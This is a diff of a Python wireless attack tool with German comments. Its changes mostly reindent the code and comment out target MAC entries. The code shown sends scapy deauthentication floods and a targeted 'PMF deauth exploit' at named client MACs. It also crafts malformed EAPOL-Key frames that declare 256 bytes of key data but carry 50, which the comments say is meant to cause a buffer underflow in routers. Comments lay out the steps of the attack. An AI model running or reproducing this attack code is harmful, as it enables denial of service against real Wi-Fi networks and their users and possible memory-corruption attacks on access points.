@@ -37,8 +37,8 @@ MANUELLER_KANAL_2_4GHZ = "1"
 
 # --- 4. TARGET CLIENTS (For targeted attacks) --- For: pmf_deauth_exploit, deauth_flood, malformed_msg1_length & malformed_msg1_flags
 TARGET_STA_MACS = [
-    "AA:BB:CC:DD:EE:11", 
-    "AA:BB:CC:DD:EE:11",
+#    "AA:BB:CC:DD:EE:11", 
+#    "AA:BB:CC:DD:EE:11",
     "AA:BB:CC:DD:EE:11"
 ]
 
@@ -118,7 +118,7 @@ SAE_FINITE_5_HEX = 'INSERT_5_FINITE_HERE'
 def run_deauth_disassoc_process(interface, bssid, channel, sta_mac_list, attack_type, counter, **kwargs):
     from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth
     print(f"[INFO-DEAUTH] Process {interface} ({attack_type}) started on CH {channel}...")
-    
+
     try:
         subprocess.run(['iwconfig', interface, 'channel', channel], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except: return
@@ -127,39 +127,39 @@ def run_deauth_disassoc_process(interface, bssid, channel, sta_mac_list, attack_
         if not sta_mac_list: 
             print(f"[WARNING] No targets for {interface}. Paused.")
             time.sleep(999); return
-            
+
         while True:
             packet_list = []
-            
+
             for sta_mac in sta_mac_list:
                 # Frame 1: AP -> Client (Du wurdest gekickt)
                 p1 = RadioTap()/Dot11(addr1=sta_mac, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
                 # Frame 2: Client -> AP (Ich gehe) - Optional, erhöht Verwirrung
                 p2 = RadioTap()/Dot11(addr1=bssid, addr2=sta_mac, addr3=bssid)/Dot11Deauth(reason=7)
-                
-if attack_type == "pmf_deauth_exploit":
-    # Nur ein einzelner, gezielter Trigger-Frame reicht oft
-    packet_list = [p1] 
-    
-    # WICHTIG: Senden Sie dies NICHT sofort in einer Dauerschleife.
-    # Der Angriff verlangt: 
-    # 1. Router überlasten (durch andere Prozesse)
-    # 2. Einmalig kicken
-    # 3. Warten (damit der Client ins Timeout läuft)
-    
-    # Senden
-    try:
-        sendp(packet_list, count=1, verbose=0, iface=interface)
-        with counter.get_lock(): counter.value += 1
-    except: pass
-    
-    # LANGE PAUSE für den Timeout-Effekt beim Client
-    print(f"[{interface}] PMF Trigger sent. Waiting 15s for client timeout...")
-    time.sleep(15) 
-            else:
-                # Flood: Feuer frei
-                time.sleep(0.05)
-                
+
+                if attack_type == "pmf_deauth_exploit":
+                    # Nur ein einzelner, gezielter Trigger-Frame reicht oft
+                    packet_list = [p1] 
+
+                    # WICHTIG: Senden Sie dies NICHT sofort in einer Dauerschleife.
+                    # Der Angriff verlangt: 
+                    # 1. Router überlasten (durch andere Prozesse)
+                    # 2. Einmalig kicken
+                    # 3. Warten (damit der Client ins Timeout läuft)
+
+                    # Senden
+                    try:
+                        sendp(packet_list, count=1, verbose=0, iface=interface)
+                        with counter.get_lock(): counter.value += 1
+                    except: pass
+
+                    # LANGE PAUSE für den Timeout-Effekt beim Client
+                    print(f"[{interface}] PMF Trigger sent. Waiting 15s for client timeout...")
+                    time.sleep(15)
+                else:
+                    # Flood: Feuer frei
+                    time.sleep(0.05)
+
     except KeyboardInterrupt: pass
 
 def run_sae_attack_process(interface, bssid, channel, sta_mac_list, attack_type, counter, **kwargs):
@@ -234,6 +234,7 @@ def run_eapol_attack_process(interface, bssid, channel, sta_mac_list, attack_typ
     try:
         subprocess.run(['iwconfig', interface, 'channel', channel], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except Exception as e: print(f"[ERROR-EAPOL] Channel switch for {interface} failed: {e}"); return
+
     def create_eapol_packet(target_sta_mac, malform_type):
         dot11 = Dot11(type="Data", subtype=8, addr1=target_sta_mac, addr2=bssid, addr3=bssid, FCfield="to-DS")
         llc = LLC(); snap = SNAP(OUI=0x000000, code=0x888e); eapol = EAPOL(type=3)
@@ -245,11 +246,12 @@ def run_eapol_attack_process(interface, bssid, channel, sta_mac_list, attack_typ
         eapol_key.key_len=16; eapol_key.replay_ctr=1; eapol_key.nonce=os.urandom(32)
         packet = RadioTap()/dot11/llc/snap/eapol/eapol_key
         if malform_type == 'malformed_msg1_length':
-    # Wir sagen dem Router: "Hier kommen 256 Bytes Daten"
-    eapol_key.key_data_len = 256
-    # Aber wir senden tatsächlich nur 50 Bytes (Nullen) -> Buffer Underflow beim Lesen
-    packet /= Raw(load=b'\x00' * 50)
+            # Wir sagen dem Router: "Hier kommen 256 Bytes Daten"
+            eapol_key.key_data_len = 256
+            # Aber wir senden tatsächlich nur 50 Bytes (Nullen) -> Buffer Underflow beim Lesen
+            packet /= Raw(load=b'\x00' * 50)
         return packet
+
     try:
         if not sta_mac_list: print(f"[WARNING-EAPOL] No target client for {interface}. Process paused."); time.sleep(999); return
         while True:
@@ -388,5 +390,4 @@ def main():
     finally: cleanup(procs)
 
 if __name__ == "__main__":
-    main()
-    
+    main()    
